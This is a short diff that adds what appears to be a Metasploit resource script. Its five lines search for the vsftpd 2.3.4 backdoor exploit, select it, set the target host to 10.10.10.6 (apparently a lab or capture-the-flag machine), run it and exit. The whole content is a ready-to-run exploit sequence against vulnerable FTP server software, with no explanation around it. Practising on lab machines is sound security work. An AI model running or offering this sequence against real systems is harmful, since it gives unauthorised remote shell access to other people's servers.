@@ -1,0 +1,5 @@
+search vsftpd 2.3.4
+use 0
+set rhost 10.10.10.6   
+run
+exit
